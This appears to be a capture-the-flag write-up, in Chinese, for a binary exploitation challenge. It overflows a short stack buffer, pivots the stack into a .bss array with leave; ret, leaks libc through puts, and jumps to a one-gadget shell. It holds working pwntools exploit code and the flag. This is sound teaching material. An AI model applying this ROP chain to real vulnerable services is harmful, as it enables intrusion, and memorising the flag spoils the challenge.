# Milk Tea Shop

## 题目简述

64 位 ELF 未启用 PIE 和栈 canary，但启用了 NX。第一次输入可向全局 `.bss` 数组 `order` 写入 `0xff` 字节；第二次输入把 `0x40` 字节写入 40 字节的栈缓冲区 `feedback`。后者足以覆盖保存的 `RBP` 和返回地址，可先把栈迁移到 `.bss` 执行长 ROP 链，再泄露 libc 并进入第二阶段。

## 解题过程

已知关键地址为：

```text
order        = 0x4040a0
leave; ret   = 0x4012a7
ret          = 0x4012a8
pop rdi; ret = 0x401203
puts@plt     = 0x401070
printf@got   = 0x404020
```

先把用于泄露的 ROP 链写入 `order`。链用 `puts(printf@got)` 输出 `printf` 的真实地址，再回到 `main` 中接收第二轮反馈的位置：

```python
rop = ROP(exe)
for _ in range(24):
    rop.raw(0x4012a8)
rop.rdi = 0x404020
rop.raw(0x401070)
rop.rbp = 0x404500
rop.raw(0x40127d)
io.sendafter(b"order: ", rop.chain())
```

`feedback` 到保存的 `RBP` 偏移为 `0x30`。将保存的 `RBP` 改为 `order - 8`，返回地址改为 `leave; ret`；`leave` 后栈顶落到 `.bss`，开始执行第一阶段：

```python
stage1 = b"A" * 0x30 + p64(0x4040a0 - 8) + p64(0x4012a7)
io.sendafter(b"Feedback > ", stage1)

io.recvuntil(b"Thank you and see you soon!\n")
printf_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
libc.address = printf_addr - libc.sym["printf"]
```

回到第二轮读入后，再次覆盖返回地址。官方随附 glibc 2.35 中偏移 `0x50a40` 的 one-gadget 在此调用现场满足约束：

```python
stage2 = b"A" * 0x30 + p64(0) + p64(libc.address + 0x50a40)
io.send(stage2)
```

本地测试使用题目配套的 `ld-2.35.so` 与 `libc.so.6` 启动服务二进制，完整完成栈迁移、泄露和第二阶段，最终读取 `grey{a_milk_tea_a_day_keeps_depression_away}`。

## 方法总结

短栈溢出不一定能直接容纳完整 ROP；若程序另有大块可写全局区，可以用 `leave; ret` 把它变成新栈。第二阶段必须使用与远端一致的 libc 计算偏移，不能拿主机 libc 的地址替代。最终 flag 为 `grey{a_milk_tea_a_day_keeps_depression_away}`。
